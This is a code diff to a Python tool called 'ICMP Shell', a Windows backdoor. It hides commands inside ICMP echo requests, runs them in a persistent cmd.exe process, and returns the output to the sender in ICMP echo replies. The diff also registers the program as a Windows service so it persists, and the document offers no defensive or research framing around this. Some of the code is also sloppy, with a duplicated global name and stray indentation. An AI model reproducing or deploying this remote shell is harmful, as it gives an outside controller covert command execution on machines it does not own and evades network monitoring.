@@ -11,10 +11,9 @@ import time
 import servicemanager
 import win32event
 import win32service
-from Demos.print_desktop import p
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
-from scapy.sendrecv import sniff, send
+from scapy.sendrecv import sniff, send, sendp
 from win32con import DETACHED_PROCESS
 
 import ish_open
@@ -23,31 +22,42 @@ import win32serviceutil
 
 output = None
 error = None
-p = None
-destination=""
+p = subprocess.Popen(
+    "cmd.exe",
+    stdout=subprocess.PIPE,
+    stdin=subprocess.PIPE,
+    stderr=subprocess.PIPE,
+)
+destination_ip = ""
+source_ip = ""
+destination_mac = "ff:ff:ff:ff:ff:ff"
+source_mac = "ff:ff:ff:ff:ff:ff"
 
 
 def readstdout():
+    global p, destination_ip, destination_mac, source_mac, source_mac
     for l in iter(p.stdout.readline, b""):
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = IP(dst=destination) / ICMP(type=0, id=1515) / string
-        send(reply_packet, verbose=False)
-        sys.stdout.write(string)
+        reply_packet = Ether(src=source_mac, dst=destination_mac) / IP(src=source_ip, dst=destination_ip) / ICMP(type=0, id=1515) / string
+        sendp(reply_packet, verbose=False)
+        sys.stdout.write(string + "\n")
 
 
 # Function to read and print stderr of the subprocess
 def readstderr():
+    global p
     for l in iter(p.stderr.readline, b""):
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
-        reply_packet = IP(dst=destination) / ICMP(type=0, id=1515) / string
+        reply_packet = IP(dst=destination_ip) / ICMP(type=0, id=1515) / string
         send(reply_packet, verbose=False)
-        sys.stderr.write(string)
+        sys.stderr.write(string + "\n")
 
 
 # Function to send a command to the subprocess
 def sendcommand(cmd):
+    global p
     p.stdin.write(cmd.encode() + b"\n")
     p.stdin.flush()
 
@@ -59,9 +69,12 @@ def split_string_by_bytes(input_string, byte_length):
 
 
 def packet_callback(packet):
-    global destination
+    global destination_ip, destination_mac, source_ip, source_mac
     if ICMP in packet and packet[ICMP].id == 1515 and packet[ICMP].type == 8:
-        destination = packet[IP].src
+        destination_ip = packet[IP].src
+        source_ip = packet[IP].dst
+        destination_mac = packet[Ether].src
+        source_mac = packet[Ether].dst
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ OUT DATA +-----")
         # child_conn, process = ish_open.popen2(received_data)
@@ -80,10 +93,10 @@ def packet_callback(packet):
         # print(output)
         # print(error)
         sendcommand(received_data)
-        #if output == '':
+        # if output == '':
         #    reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
         #    send(reply_packet, verbose=False)
-        #else:
+        # else:
         #    data_list = split_string_by_bytes(output, 200)
         #    data_list.append('\n')
         #    for p in data_list:
@@ -150,7 +163,6 @@ def edaemon():
 
 
 def main():
-    global p
     ish_debug = 1
 
     parser = argparse.ArgumentParser(description='ICMP Shell')
@@ -170,13 +182,6 @@ def main():
         ishell.ish_info.packetsize = args.p
     if args.d:
         ish_debug = 0
-
-    p = subprocess.Popen(
-        "cmd.exe",
-        stdout=subprocess.PIPE,
-        stdin=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-    )
 
     t1 = threading.Thread(target=readstdout)
     t2 = threading.Thread(target=readstderr)
@@ -233,7 +238,6 @@ class Service(win32serviceutil.ServiceFramework):
         win32serviceutil.ServiceFramework.__init__(self, *args)
         self.log('Service Initialized.')
         self.stop_event = win32event.CreateEvent(None, 0, 0, None)
-        socket.setdefaulttimeout(60)
 
     def log(self, msg):
         servicemanager.LogInfoMsg(str(msg))
@@ -258,6 +262,11 @@ class Service(win32serviceutil.ServiceFramework):
             self.log('Exception :' + s)
 
     def main(self):
+        t1 = threading.Thread(target=readstdout)
+        t2 = threading.Thread(target=readstderr)
+
+        t1.start()
+        t2.start()
         sniff(filter="icmp", prn=packet_callback)
 
 
@@ -280,10 +289,10 @@ def server():
 
 
 if __name__ == '__main__':
-    main()
-    # if len(sys.argv) == 1:
-    #    servicemanager.Initialize()
-    #    servicemanager.PrepareToHostSingle(Service)
-    #    servicemanager.StartServiceCtrlDispatcher()
-    # else:
-    #    win32serviceutil.HandleCommandLine(Service)
+    #main()
+     if len(sys.argv) == 1:
+       servicemanager.Initialize()
+       servicemanager.PrepareToHostSingle(Service)
+       servicemanager.StartServiceCtrlDispatcher()
+     else:
+       win32serviceutil.HandleCommandLine(Service)
